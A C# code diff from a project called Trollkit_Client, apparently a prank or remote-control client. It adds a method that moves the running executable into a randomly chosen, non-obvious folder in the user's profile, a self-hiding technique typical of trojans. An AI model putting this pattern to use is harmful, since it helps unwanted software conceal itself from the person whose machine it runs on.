@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Trollkit_Library;
 
 namespace Trollkit_Client.Modules
 {
@@ -19,11 +20,11 @@ namespace Trollkit_Client.Modules
 		public string FindRandomFileLocation()
 		{
 			string filename = Process.GetCurrentProcess().MainModule.FileName;
-			Console.WriteLine(filename);
+			BConsole.WriteLine(filename);
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 			string[] dir = Directory.GetFileSystemEntries(path);
 
-			string[] ex_filter = new string[] { "Desktop", "Documents", "My Documents", "Downloads", "Pictures", "Videos", "Music" };
+			string[] ex_filter = new string[] { "Desktop", "Documents", "My Documents", "Downloads", "Pictures", "Videos", "Music", "Cookies" };
 
 			List<string> files = dir.Where(n => !ex_filter.Contains(n.Split('\\').Last())).ToList();
 
@@ -34,6 +35,19 @@ namespace Trollkit_Client.Modules
 			}
 
 			return fndPath;
+		}
+
+		public string MoveFileToLocation(string destinationPath)
+		{
+			try {
+				File.Move(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName);
+			}
+			catch (IOException iox)
+			{
+				BConsole.WriteLine(iox.Message);
+			}
+
+			return destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName;
 		}
 	}
 }
